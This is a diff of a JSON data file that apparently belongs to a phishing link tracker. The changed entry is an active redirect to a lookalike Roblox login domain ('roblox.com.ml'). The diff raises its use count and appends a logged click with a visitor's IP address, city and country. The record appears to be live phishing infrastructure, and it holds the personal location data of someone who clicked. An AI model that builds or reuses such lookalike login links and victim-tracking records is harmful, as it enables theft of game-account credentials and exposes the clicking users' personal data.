@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 659,
+    "useCount": 660,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5384,6 +5384,14 @@
         "city": "Vigo",
         "flag": "🇪🇸",
         "countryCode": "ES"
+      },
+      {
+        "timestamp": 1777125900589,
+        "ip": "176.1.66.239",
+        "country": "Germany",
+        "city": "Leipzig",
+        "flag": "🇩🇪",
+        "countryCode": "DE"
       }
     ]
   },
